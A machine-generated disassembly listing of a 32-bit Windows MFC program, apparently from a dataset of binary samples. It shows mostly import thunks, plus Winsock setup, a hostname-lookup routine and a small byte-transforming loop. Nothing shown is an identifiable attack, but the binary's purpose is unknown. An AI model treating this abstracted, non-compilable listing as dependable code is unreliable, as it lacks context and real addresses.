retn 0x4
sub_401136
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_40114c
mov eax r--data
retn
sub_4011a5
push esi
mov esi ecx
call sub_40112d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_4011c1
retn 0x4
sub_4011c4
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_4011ca
mov eax r--data
retn
sub_40135e
mov eax [ ecx + 0x60 ]
retn
sub_401362
jmp Ordinal_MFC42_4853
sub_401367
push 0x0
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_401373
push 0x1
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_4013bc
mov eax r-xdata
retn
sub_401642
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_4023f8
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
or dl 0xff
add eax ecx
sub dl cl
add [ eax ] dl
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
sub_402488
push [ esp + 0x4 ]
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_4027ec
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_402668
pop ecx
pop ecx
retn
sub_402d30
push [ rw-data ]
call sub_4031f4
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403059
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_1146
jmp [ Ordinal_MFC42_1146@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_4160
jmp [ Ordinal_MFC42_4160@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_2863
jmp [ Ordinal_MFC42_2863@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
sub_40379e
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_4037ca
push [ esp + 0x4 ]
call sub_40379e
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
memset
jmp [ memset@IAT ]
memcpy
jmp [ memcpy@IAT ]
strlen
jmp [ strlen@IAT ]
strcmp
jmp [ strcmp@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4039c6
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4039d8
xor eax eax
retn
sub_4039db
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_4039f0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_403a36
jmp sub_403a36
sub_403a36
push 0x600
push 0x0
call sub_403a08
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
sub_403a50
lea ecx [ ebp - 0x78 ]
jmp sub_40112d
sub_403a58
mov eax r--data
jmp __CxxFrameHandler
sub_403a64
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_403a6c
mov eax r--data
jmp __CxxFrameHandler
sub_403a78
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_403a80
mov eax r--data
jmp __CxxFrameHandler
sub_403a8c
lea ecx [ ebp - 0x6c ]
jmp sub_40112d
sub_403a94
mov eax r--data
jmp __CxxFrameHandler
sub_403aa0
mov eax r--data
jmp __CxxFrameHandler
